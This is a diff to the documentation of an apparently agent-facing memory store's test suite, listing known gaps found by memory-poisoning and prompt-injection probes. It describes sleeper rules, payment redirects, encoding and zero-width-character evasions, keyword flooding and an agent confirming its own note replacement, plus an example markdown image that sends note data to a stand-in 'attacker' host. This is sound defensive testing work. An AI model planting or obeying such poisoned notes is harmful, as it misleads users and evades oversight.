@@ -802,7 +802,7 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 [docs/replacing-memories.md](./replacing-memories.md).
 
 **Known gaps.** Scenarios that fail because Monomem lacks the behaviour are kept, marked, and listed here and in the report. They do not fail the run
-(`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. The four recorded at 1.5.0 are fixed, and so is the one the memory-poisoning suite found (`GAP-POISON-MDLINK`, OneMemory 2.0.0), and so is `GAP-OBSOLETE-UNREPLACED` (A33, found and fixed in Monomem 1.5.0). **None is open.**
+(`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. The four recorded at 1.5.0 are fixed, and so is the one the memory-poisoning suite found (`GAP-POISON-MDLINK`, OneMemory 2.0.0), and so is `GAP-OBSOLETE-UNREPLACED` (A33, found and fixed in Monomem 1.5.0). **None of those is open. Six new ones were opened on 2026-11-23** by the attack-expansion probes (scenarios F01 to F18, see [attack-expansion-2026-11-23.md](./attack-expansion-2026-11-23.md)): the rows marked **Open** below. They are real misses, kept as known gaps instead of being removed.
 
 | Gap | What was missing | Status | Scenarios |
 |---|---|---|---|
@@ -813,6 +813,12 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 | `GAP-CONFIDENCE` | No confidence field; a client could send one but it was dropped silently. | **Fixed in 1.6.0**: optional, validated, labelled as a claim. | D10 (now passes) |
 | `GAP-POISON-MDLINK` | The write-time linter did not flag markdown images whose URL smuggles note data out (e.g. `![x](https://attacker/p?data=...)`); such a note was stored as ordinary memory. | **Fixed in OneMemory 2.0.0**: a remote markdown image with a query string is held for review; README badge hosts are exempt. | E11 (now passes) |
 | `GAP-OBSOLETE-UNREPLACED` | A later note updates a fact in different words and nobody replaces the old note: keyword search and the "what is relevant" lookup rank the **old** note first (it matches as well and is shorter). | **Fixed in Monomem 1.5.0**: for the same writer, the same subject and a near tie, the newer note ranks first and the old one is kept right behind it, labelled `restated_by`; never for another writer, over a person-confirmed note, or for outside content. The two-step replace (A34) still removes the old value everywhere. | A33 (now passes); guards A35 to A38 |
+| `GAP-PROBE-CONTEXT` | Context-poisoning notes with no command words (a dated sleeper rule, a payment redirect, a false "correction", a policy override, a slow drip of harmless fragments) are stored and served. | **Open** (2026-11-23). Only the read-side banner, the writer label and the trust rules defend. | F01, F06 |
+| `GAP-PROBE-ENCODING` | Pig latin, acrostics, NATO spelling, upside-down text, regional-indicator letters, half of a split base64 blob, and an instruction split between a title and a source with a body between them. | **Open** (2026-11-23). Rot13, reversed text, Caesar shifts, numeric codes, base32, Morse and seven more languages were closed in the same round. | F08 |
+| `GAP-PROBE-TOOLSTYLE` | Tool-steering text inside a fact value or a source label. | **Open** (2026-11-23). | F10 |
+| `GAP-PROBE-STEGO` | Sparse zero-width marks (one every few letters) and a run of only three variation selectors. | **Open** (2026-11-23). | F12 |
+| `GAP-PROBE-FLOOD` | Eight keyword-stuffed notes from an outside writer push the trusted answer out of the top five (keyword search, titles weigh five times a body). | **Open** (2026-11-23). | F02 |
+| `GAP-SUPERSEDE-ABUSE` | A write key (not admin) could preview and confirm replacing another writer's trusted (or pinned, or five) notes, and an agent could confirm its own preview. | **Fixed in 1.8.0**: replacing a note now needs a person (MCP connections and write-key apps are refused at the confirm; `MONOMEM_REPLACE_CONFIRM=agent` restores the old behaviour). F15, F16, F18 now pass; the markers were removed. | F15, F16, F17, F18 |
 
 **Round 1 retrieval changes, 2026-11-05 (no change in these numbers).** The session-start context now uses one
 any-keyword search instead of one per keyword; "how many / total / every / list all" questions return twice the
